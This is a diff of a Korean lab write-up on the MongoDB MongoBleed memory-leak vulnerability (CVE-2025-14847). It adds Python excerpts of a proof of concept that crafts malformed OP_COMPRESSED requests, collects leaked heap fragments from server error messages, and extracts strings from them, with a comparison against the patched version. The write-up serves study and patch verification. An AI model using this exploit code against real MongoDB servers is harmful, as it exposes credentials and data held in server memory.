@@ -10,7 +10,7 @@ sample: false
 
 > **실제 압축 해제 길이와 할당된 버퍼 크기를 혼동하면 어떤 문제가 발생할까?** 로컬 환경에서 MongoBleed를 재현하며, 조작된 메시지가 메모리 정보 노출로 이어지는 과정과 패치 전후의 동작 차이를 확인했다.
 
-MongoDB에서 공개된 **MongoBleed(CVE-2025-14847)** 취약점을 대상으로 공개 PoC의 동작을 분석하고, Docker 기반 테스트 환경에서 이를 재현했다.
+MongoDB에서 공개된 **MongoBleed(CVE-2025-14847)** 취약점을 대상으로 [실습 저장소의 PoC](https://github.com/cprtmchzh/mongobleed-poc) 동작을 분석하고, Docker 기반 테스트 환경에서 이를 재현했다.
 
 이번 실습의 목표는 **조작된 입력값이 MongoDB 내부 처리를 거쳐 메모리 정보 노출로 이어지는 과정을 확인하는 것**이다. PoC 실행 결과를 수집하고 Wireshark로 요청·응답 패킷을 분석한 뒤, 패치된 버전에서 동일한 테스트를 수행해 결과를 비교했다.
 
@@ -65,7 +65,7 @@ MongoDB는 네트워크 통신량을 줄이기 위해 기존 메시지를 압축
 
 ### BSON 파싱 오류가 응답으로 이어지는 과정
 
-공개 PoC는 BSON 문서의 길이 필드도 함께 조작한다. 후속 BSON 파싱 과정에서 초기화되지 않은 메모리 영역이 필드명 등으로 읽히며, 파싱 오류를 알리는 서버 응답에 해당 메모리 내용이 포함된다.
+실습 PoC는 BSON 문서의 길이 필드도 함께 조작한다. 후속 BSON 파싱 과정에서 초기화되지 않은 메모리 영역이 필드명 등으로 읽히며, 파싱 오류를 알리는 서버 응답에 해당 메모리 내용이 포함된다.
 
 1. 서버가 조작된 `OP_COMPRESSED` 요청을 받고, 선언된 크기에 맞춰 버퍼를 준비한다.
 2. 압축을 해제하면 버퍼 앞부분만 데이터로 채워지고 나머지 영역은 초기화되지 않은 상태로 남을 수 있다.
@@ -73,7 +73,7 @@ MongoDB는 네트워크 통신량을 줄이기 위해 기존 메시지를 압축
 4. BSON 파서가 남은 영역까지 필드명 등으로 읽으면서 파싱 오류가 발생할 수 있다.
 5. 오류를 설명하는 응답에 읽어 들인 내용이 포함되면, 기존 힙 메모리의 조각이 클라이언트에 전달될 수 있다.
 
-위 흐름은 [공개 PoC의 설명과 코드](https://github.com/joe-desimone/mongobleed)를 바탕으로 정리했다. 핵심은 **서버가 초기화되지 않은 메모리 조각을 오류 응답의 일부로 클라이언트에 반환한다는 점**이다.
+위 흐름은 [실습 저장소의 요청 생성·응답 처리 코드](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py#L8-L76)를 바탕으로 정리했다. 핵심은 **서버가 초기화되지 않은 메모리 조각을 오류 응답의 일부로 클라이언트에 반환한다는 점**이다.
 
 ## 03. 실습 환경
 
@@ -89,42 +89,160 @@ MongoDB는 네트워크 통신량을 줄이기 위해 기존 메시지를 압축
 
 Python PoC는 TCP로 요청을 전송하고 MongoDB가 반환한 오류 응답을 수집했다. Wireshark에서는 같은 통신의 요청·응답 패킷을 관찰해 PoC의 출력과 비교했다.
 
-## 04. 공개 PoC 코드 분석
+### 실습 코드와 테스트 데이터
 
-실습에는 Joe Desimone이 공개한 [`mongobleed.py`](https://github.com/joe-desimone/mongobleed/blob/main/mongobleed.py)를 사용했다. 코드는 요청 생성부터 결과 저장까지 총 4단계로 동작한다.
-
-### 1. 조작된 요청 생성
-
-길이를 조작한 BSON 데이터를 생성해 `OP_MSG` 본문으로 구성한 뒤 zlib으로 압축한다. 이후 압축된 데이터를 `OP_COMPRESSED` 구조로 감싼다.
-
-| 값 | 의미 |
+| 파일 | 역할 |
 | :--- | :--- |
-| `originalOpcode = 2013` | 압축 전 메시지가 `OP_MSG`임을 명시 |
-| `uncompressedSize` | 실제 압축 해제 크기보다 크게 지정한 길이 |
-| `compressorId = 2` | zlib 압축 사용 |
-| `compressedMessage` | 조작된 BSON을 포함한 압축 데이터 |
+| [`docker-compose.yml`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/docker-compose.yml) | MongoDB `6.0.26`과 zlib 압축을 사용하는 재현 환경 정의 |
+| [`init/init-mongo.py`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/init/init-mongo.py) | 테스트용 사용자·토큰·키 데이터를 넣고 반복 조회 |
+| [`mongobleed_poc.py`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py) | 요청 생성, 응답 수신, 메모리 조각 수집 |
+| [`extract_strings.py`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/extract_strings.py) | 수집 파일에서 읽을 수 있는 문자열 추출 |
 
-여기서 **BSON 내부에 선언한 문서 길이와 `OP_COMPRESSED`에 선언한 `uncompressedSize`는 서로 다른 역할을 한다.** 후자는 서버가 과도한 크기의 버퍼를 유효 데이터로 넘기게 만들고, 전자는 BSON 파서가 그 버퍼의 끝부분까지 읽도록 유도한다.
+테스트 문자열은 `init/init-mongo.py`에서 준비한다. 이 스크립트는 `testdb`의 `userInfo`, `token`, `apiKey` 컬렉션 데이터를 비운 뒤 예제 데이터를 삽입하고, 마지막에 [반복 조회](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/init/init-mongo.py#L73-L77)를 수행한다.
 
-### 2. TCP 전송 및 응답 복원
+```python
+for i in range(1000):
+    list(db["userInfo"].find({}))
+    list(db["token"].find({}))
+    list(db["apiKey"].find({}))
+```
 
-생성한 메시지는 일반 MongoDB 드라이버를 거치지 않고 TCP 소켓을 통해 서버에 직접 전송한다.
+반복 조회의 의도는 DB가 테스트 데이터를 처리하면서 관련 정보가 메모리에 남을 기회를 만드는 것이다. 이를 통해 뒤에서 수집한 문자열 조각을 미리 넣어 둔 데이터와 대조할 수 있다. 다만 특정 문자열이 반드시 노출된다는 뜻은 아니다.
 
-응답 수신 시에는 패킷이 분할되어 도착할 수 있으므로, 응답 헤더의 메시지 길이를 먼저 확인한 뒤 전체 길이에 도달할 때까지 데이터를 읽어 하나의 메시지로 조립한다.
+저장소의 Compose 설정은 취약 버전 재현용이다. 이 글의 `6.0.27` 결과는 별도로 버전을 바꿔 비교한 실습 기록이다.
 
-### 3. 오류 응답에서 데이터 추출
+## 04. 실습 저장소의 PoC 코드 분석
 
-수신한 응답이 `OP_COMPRESSED` 형태라면 압축을 해제하고, 그렇지 않으면 공통 헤더 이후의 본문을 바로 읽는다.
+분석 대상은 직접 실습에 사용한 [cprtmchzh/mongobleed-poc](https://github.com/cprtmchzh/mongobleed-poc) 저장소의 코드다. 아래 발췌는 [`65b7944` 커밋](https://github.com/cprtmchzh/mongobleed-poc/commit/65b7944c90efb1510ef8d786101d3c978e23dcb9)을 기준으로 하며, 함수 전체를 옮기지 않고 처리 흐름을 이해하는 데 필요한 부분만 가져왔다.
 
-PoC는 응답 본문에서 **BSON 오류 메시지에 포함된 필드명과 인식되지 않은 타입(type) 값**을 파싱해 메모리 조각을 추출한다.
+### 1. BSON 길이와 압축 해제 버퍼 크기를 따로 지정
 
-### 4. 중복 제거 및 파일 저장
+[`op_compressed_payload()`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py#L8-L23)는 `doc_length`와 `buffer_size`를 받아 요청 바이트를 만든다. 먼저 BSON의 문서 길이 필드에 `doc_length`를 기록하고, `OP_MSG` 본문을 구성해 압축한다.
 
-문서 길이 값을 변경해 가며 요청을 반복 전송하고 응답에서 메모리 조각을 수집한다. 이미 확인된 조각은 중복을 제거한 뒤 바이너리 파일로 저장한다.
+```python
+content = b'\x10a\x00\x01\x00\x00\x00'
+bson = struct.pack('<i', doc_length) + content
+op_msg = struct.pack('<I', 0) + b'\x00' + bson
+compressed = zlib.compress(op_msg)
+```
 
-전체 과정은 **요청 생성과 전송**, **응답 복원과 데이터 추출**, **중복 제거와 파일 저장**으로 묶을 수 있다.
+`content`는 정수형 필드 `a`와 값 `1`을 담은 바이트다. `struct.pack('<i', doc_length)`는 전달받은 길이를 리틀 엔디언 4바이트 정수로 기록한다. 그 앞에 `OP_MSG`의 플래그와 본문 섹션 종류를 붙인 뒤 `zlib.compress()`를 호출한다.
 
-이후 저장된 파일에서 문자열을 추출해 실제로 어떤 정보가 노출되었는지 확인했다.
+여기서 중요한 점은 **실제 BSON 바이트 수를 계산해 넣는 대신, 함수 인자로 받은 길이를 문서에 기록한다는 것**이다. 따라서 문서에 선언된 길이와 실제 데이터 길이가 달라질 수 있다.
+
+압축한 본문은 다음과 같이 `OP_COMPRESSED` 메시지로 감싼다.
+
+```python
+payload = struct.pack('<I', 2013)
+payload += struct.pack('<i', buffer_size)
+payload += struct.pack('B', 2)
+payload += compressed
+header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
+
+return header + payload
+```
+
+| 코드에 들어가는 값 | 메시지에서의 의미 |
+| :--- | :--- |
+| `2013` | 압축 전 원본 메시지가 `OP_MSG`임을 나타내는 `originalOpcode` |
+| `buffer_size` | 압축 해제 결과의 크기로 선언하는 `uncompressedSize` |
+| `2` | zlib 압축을 나타내는 `compressorId` |
+| `16 + len(payload)` | 공통 헤더 16바이트를 포함한 전체 전송 메시지 길이 |
+| `2012` | 바깥쪽 메시지가 `OP_COMPRESSED`임을 나타내는 opcode |
+
+**`doc_length`는 BSON 파서가 읽는 문서 길이이고, `buffer_size`는 압축 해제 단계에서 사용하는 선언 크기다.** 두 값이 서로 다른 위치에 기록된다는 점을 구분하면, 길이 조작이 압축 해제와 BSON 파싱에 각각 어떻게 영향을 주는지 이해할 수 있다.
+
+### 2. TCP 응답을 메시지 길이만큼 수집
+
+[`exploit()`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py#L26-L51)는 위 함수의 반환값을 TCP 소켓으로 전송한다. 소켓에 2초 타임아웃을 설정하고 `sendall()`로 요청을 보낸 뒤, 아래 반복문에서 응답을 모은다.
+
+```python
+while True:
+    if(len(response) >= 4):
+        msg_len = struct.unpack('<I', response[:4])[0]
+        if len(response) >= msg_len:
+            break
+    chunk = sock.recv(4096)
+
+    if not chunk:
+        break
+    response += chunk
+```
+
+TCP의 한 번의 `recv()`가 MongoDB 메시지 하나와 일치하지 않을 수 있으므로, 받은 바이트를 `response`에 누적한다. **응답의 첫 4바이트에서 메시지 전체 길이 `msg_len`을 읽고, 그만큼 수신했을 때 반복을 끝내는 구조**다. 연결이 닫혀 빈 바이트가 반환되는 경우에도 수신을 종료한다.
+
+현재 구현에서는 통신 중 예외가 나면 `None`을 반환한다. 그런데 호출부가 이를 그대로 `leaked_data()`에 넘기고, 해당 함수는 처음에 `len(response)`를 호출하므로 통신 실패 시 추가 예외가 날 수 있다.
+
+### 3. 응답 opcode에 따라 본문 복원
+
+[`leaked_data()`의 응답 처리 부분](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py#L54-L66)은 공통 헤더에서 opcode를 읽어 압축 여부를 구분한다.
+
+```python
+if struct.unpack('<I', response[12:16])[0] == 2012:
+    raw = zlib.decompress(response[25:msg_len])
+else:
+    raw = response[16:msg_len]
+```
+
+`response[12:16]`은 공통 헤더의 opcode 위치다. 값이 `2012`이면 압축 메시지로 보고, 공통 헤더 16바이트와 압축 메시지 메타데이터 9바이트를 건너뛴 **25바이트 위치부터** zlib으로 압축을 해제한다. 그 외에는 공통 헤더 뒤의 데이터를 그대로 본문으로 사용한다.
+
+이 코드는 실습 환경의 **zlib 응답을 전제로 한다.** `compressorId`를 읽어 여러 압축 알고리즘으로 분기하는 로직은 없으며, 압축 해제 등 처리 중 예외가 발생하면 빈 목록을 반환한다.
+
+### 4. BSON 오류 메시지에서 메모리 조각 추출
+
+본문을 복원한 뒤에는 [두 정규식](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py#L69-L75)으로 오류 메시지에 포함된 값을 찾는다.
+
+```python
+for match in re.finditer(rb"field name '([^']*)'", raw):
+    data = match.group(1)
+    if data and data not in [b'?', b'a', b'$db', b'ping']:
+        leaks.append(data)
+
+for match in re.finditer(rb"type (\d+)", raw):
+    leaks.append(bytes([int(match.group(1)) & 0xFF]))
+```
+
+첫 번째 반복문은 `field name '...'` 안의 바이트를 추출한다. 비어 있는 값이나 `?`, `a`, `$db`, `ping`처럼 코드에서 제외한 값은 건너뛴다. BSON 파서가 기존 메모리의 일부를 필드명으로 읽었다면, 그 내용이 이 경로를 통해 수집될 수 있다.
+
+두 번째 반복문은 `type 숫자` 형태를 찾아 숫자를 1바이트 값으로 바꾼다. `& 0xFF`는 하위 8비트만 남기는 연산이다. 즉, 이 함수는 **정상적인 BSON 문서 전체를 복원하는 대신 오류 문구에 드러난 필드명과 타입 값을 수집**한다.
+
+### 5. 문서 길이를 바꾸며 수집하고 중복 제거
+
+[`main()`의 반복 수집 부분](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/mongobleed_poc.py#L87-L100)은 문서 길이를 바꾸며 요청을 전송하고, 이전에 수집하지 않은 조각만 결과에 추가한다.
+
+```python
+for doc_len in range(args.min_offset, args.max_offset):
+    response = exploit(args.host, args.port, doc_len, doc_len + 500)
+    leaks = leaked_data(response)
+
+    for data in leaks:
+        if data not in unique_leaked:
+            unique_leaked.add(data)
+            all_leaked.extend(data)
+
+with open(args.output, 'wb') as f:
+    f.write(all_leaked)
+```
+
+`doc_len`은 BSON에 선언할 문서 길이이고, `doc_len + 500`은 `buffer_size`로 전달된다. 여기서 `500`은 **선언한 BSON 길이에 더하는 값**이며, 실제 압축 해제 길이에 더해 계산한 값은 아니다.
+
+`unique_leaked`는 같은 바이트 조각이 다시 나오는지 검사하는 집합이고, `all_leaked`는 처음 발견한 조각을 순서대로 이어 붙이는 버퍼다. 마지막에는 이를 바이너리 모드로 저장한다. 따라서 결과 파일은 원래 힙 메모리의 주소와 배치를 그대로 보존한 덤프가 아니라, **중복을 제거한 수집 조각의 모음**이다.
+
+### 6. 저장한 바이너리에서 읽을 수 있는 문자열 추출
+
+수집 결과를 살펴볼 때는 같은 저장소의 [`extract_strings.py`](https://github.com/cprtmchzh/mongobleed-poc/blob/65b7944c90efb1510ef8d786101d3c978e23dcb9/extract_strings.py#L3-L30)를 사용한다. ASCII 문자열 추출 부분은 다음과 같다.
+
+```python
+def extract_ascii_strings(data: bytes, min_len: int = 4):
+    pattern = rb"[ -~]{" + str(min_len).encode() + rb",}"
+    return [m.decode("ascii", errors="ignore") for m in re.findall(pattern, data)]
+```
+
+`[ -~]`는 공백부터 `~`까지의 출력 가능한 ASCII 범위다. 기본값 `min_len=4`에 따라 이 범위의 문자가 4개 이상 이어지는 구간만 골라 문자열로 변환한다.
+
+스크립트는 `leaked.bin`을 읽고, ASCII 추출 결과와 `extract_utf16le_strings()`의 결과를 `parsed_strings.txt`에 구분해 저장한다. UTF-16LE 쪽도 출력 가능한 ASCII 바이트 뒤에 널 바이트가 붙는 패턴을 찾으므로, 모든 유니코드 문자열을 추출하는 것은 아니다.
+
+이렇게 얻은 문자열을 살펴보면서 테스트용 토큰·키 형태의 조각과 containerd·overlayfs 경로를 확인했다. 아래 재현 결과는 이 **바이너리 수집과 문자열 추출 과정**에 연결된다.
 
 ## 05. 재현 결과
 
@@ -223,7 +341,7 @@ zlib 압축 해제 로직의 핵심 수정 사항은 **할당된 버퍼 크기�
 
 | 비교 항목 | 패치 전 (`6.0.26`) | 패치 후 (`6.0.27`) |
 | :--- | :--- | :--- |
-| **테스트 방식** | 공개 PoC 요청 전송 | 동일 조건에서 재전송 |
+| **테스트 방식** | 실습 저장소의 PoC 요청 전송 | 동일 조건에서 재전송 |
 | **메모리 정보 노출** | 테스트 문자열 및 컨테이너 경로 노출 확인 | 메모리 노출 현상 발생하지 않음 |
 
 <figure style="margin: 0; text-align: center;">
@@ -273,7 +391,7 @@ zlib 압축 해제 로직의 핵심 수정 사항은 **할당된 버퍼 크기�
 - [MongoDB Jira · SERVER-115508](https://jira.mongodb.org/browse/SERVER-115508)
 - [MongoDB 수정 소스 · zlib 압축 해제 길이 반환](https://github.com/mongodb/mongo/blob/505b660a14698bd2b5233bd94da3917b585c5728/src/mongo/transport/message_compressor_zlib.cpp)
 - [NVD · CVE-2025-14847](https://nvd.nist.gov/vuln/detail/CVE-2025-14847)
-- [Joe Desimone · mongobleed.py](https://github.com/joe-desimone/mongobleed/blob/main/mongobleed.py)
+- [cprtmchzh · MongoBleed 실습 저장소](https://github.com/cprtmchzh/mongobleed-poc)
+- [본문 코드 발췌 기준 · `65b7944`](https://github.com/cprtmchzh/mongobleed-poc/commit/65b7944c90efb1510ef8d786101d3c978e23dcb9)
 - [ASEC · MongoBleed(CVE-2025-14847): 8년간 숨겨져 있던 치명적 MongoDB 메모리 유출 취약점](https://asec.ahnlab.com/ko/92039/)
 - 실습 발표자료: 「CVE-2025-14847 MongoBleed 취약점 분석 및 PoC」 (`mongobleed_poc.pdf`, 본문 캡처 출처: 13·16·20쪽)
-
